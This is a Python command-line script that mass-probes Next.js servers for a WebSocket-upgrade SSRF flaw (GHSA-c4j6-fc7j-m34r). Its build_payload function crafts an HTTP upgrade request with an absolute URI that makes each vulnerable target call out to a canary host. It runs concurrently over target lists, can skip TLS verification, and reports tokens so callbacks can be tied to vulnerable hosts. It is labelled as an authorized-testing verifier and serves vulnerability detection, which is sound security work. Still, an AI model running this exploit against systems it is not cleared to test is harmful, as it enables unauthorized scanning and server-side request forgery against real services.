#!/usr/bin/env python3
"""
verify_ghsa_c4j6.py — OOB SSRF verifier for GHSA-c4j6-fc7j-m34r / CVE-2026-44578
(Next.js WebSocket-upgrade SSRF; affected: next >=13.4.13 <15.5.16, >=16.0.0 <16.2.5)

For authorized security testing only. The script sends a crafted HTTP/1.1
upgrade with an absolute request-URI pointing at a canary you control. Each
target gets a unique token in the canary path; correlate inbound hits on your
server logs to determine which targets are vulnerable.

Usage:
  python3 verify_ghsa_c4j6.py --canary https://my-collab.example/probe \
      --targets-file targets.txt
  python3 verify_ghsa_c4j6.py --canary https://my-collab.example/probe \
      --target https://app1.example.com --target app2.example.com:3000
  cat targets.txt | python3 verify_ghsa_c4j6.py --canary https://my-collab.example/probe
"""

from __future__ import annotations

import argparse
import asyncio
import json
import secrets
import ssl
import sys
from urllib.parse import urlsplit


DEFAULT_TIMEOUT = 5.0
DEFAULT_CONCURRENCY = 10


def build_payload(canary_base: str, token: str, target_host_header: str) -> bytes:
    canary = canary_base.rstrip("/") + "/" + token
    lines = [
        f"GET {canary} HTTP/1.1",
        f"Host: {target_host_header}",
        "Connection: Upgrade",
        "Upgrade: websocket",
        "Sec-WebSocket-Version: 13",
        "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==",
        "",
        "",
    ]
    return "\r\n".join(lines).encode("latin-1")


def parse_target(url: str) -> tuple[str, int, bool]:
    if "://" not in url:
        url = "http://" + url
    parts = urlsplit(url)
    host = parts.hostname
    if not host:
        raise ValueError(f"invalid target: {url}")
    is_tls = parts.scheme == "https"
    port = parts.port or (443 if is_tls else 80)
    return host, port, is_tls


async def probe_one(target: str, canary: str, timeout: float, verify_tls: bool) -> dict:
    token = secrets.token_hex(8)
    try:
        host, port, is_tls = parse_target(target)
    except ValueError as e:
        return {"target": target, "token": token, "status": "invalid", "error": str(e)}

    host_header = host if port in (80, 443) else f"{host}:{port}"
    payload = build_payload(canary, token, host_header)

    try:
        if is_tls:
            ctx = ssl.create_default_context()
            if not verify_tls:
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port, ssl=ctx, server_hostname=host),
                timeout=timeout,
            )
        else:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port), timeout=timeout
            )
    except (asyncio.TimeoutError, OSError, ssl.SSLError) as e:
        return {"target": target, "token": token, "status": "connect_error", "error": str(e)}

    try:
        writer.write(payload)
        await writer.drain()
        try:
            data = await asyncio.wait_for(reader.read(2048), timeout=timeout)
        except asyncio.TimeoutError:
            data = b""
        snippet = data[:200].decode("latin-1", "replace").replace("\r", " ").replace("\n", " ")
        return {
            "target": target,
            "token": token,
            "status": "sent",
            "response_snippet": snippet,
        }
    except OSError as e:
        return {"target": target, "token": token, "status": "send_error", "error": str(e)}
    finally:
        try:
            writer.close()
            await writer.wait_closed()
        except Exception:
            pass


async def run(targets, canary, concurrency, timeout, verify_tls):
    sem = asyncio.Semaphore(concurrency)

    async def bound(t):
        async with sem:
            return await probe_one(t, canary, timeout, verify_tls)

    return await asyncio.gather(*(bound(t) for t in targets))


def load_targets(args) -> list[str]:
    targets: list[str] = []
    if args.targets_file:
        with open(args.targets_file) as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    targets.append(line)
    if args.target:
        targets.extend(args.target)
    if not targets and not sys.stdin.isatty():
        for line in sys.stdin:
            line = line.strip()
            if line and not line.startswith("#"):
                targets.append(line)
    # dedupe while preserving order
    seen = set()
    out = []
    for t in targets:
        if t not in seen:
            seen.add(t)
            out.append(t)
    return out


def main() -> int:
    p = argparse.ArgumentParser(
        description="OOB verifier for GHSA-c4j6-fc7j-m34r (Next.js WebSocket-upgrade SSRF)."
    )
    p.add_argument("--canary", required=True,
                   help="Your callback base URL, e.g. https://collab.example.com/probe")
    p.add_argument("--target", action="append", default=[],
                   help="A target (host:port or URL). Repeat for multiple.")
    p.add_argument("--targets-file",
                   help="File with one target per line (# comments allowed).")
    p.add_argument("--timeout", type=float, default=DEFAULT_TIMEOUT)
    p.add_argument("--concurrency", type=int, default=DEFAULT_CONCURRENCY)
    p.add_argument("--insecure", action="store_true",
                   help="Skip TLS certificate verification for https targets.")
    p.add_argument("--json", action="store_true",
                   help="Emit JSON Lines instead of human-readable output.")
    args = p.parse_args()

    targets = load_targets(args)
    if not targets:
        p.error("provide --target, --targets-file, or pipe targets on stdin")

    results = asyncio.run(
        run(targets, args.canary, args.concurrency, args.timeout, not args.insecure)
    )

    for r in results:
        if args.json:
            print(json.dumps(r))
        else:
            line = f"[{r['status']:>14}] target={r['target']:<50} token={r['token']}"
            if "error" in r:
                line += f"  error={r['error']}"
            print(line)

    if not args.json:
        sent = [r for r in results if r["status"] == "sent"]
        print()
        print(f"Sent {len(sent)} of {len(results)} payloads.")
        if sent:
            print("Tokens to watch for on your canary server:")
            print("  " + ",".join(r["token"] for r in sent))
            print()
            print("Any inbound HTTP request to your canary path containing one of")
            print("those tokens ⇒ that target is vulnerable to GHSA-c4j6-fc7j-m34r.")
            print("Targets that sent payload but produce no callback are likely")
            print("patched, behind a reverse proxy that strips upgrades, on Vercel,")
            print("or have egress filtering blocking the canary host.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
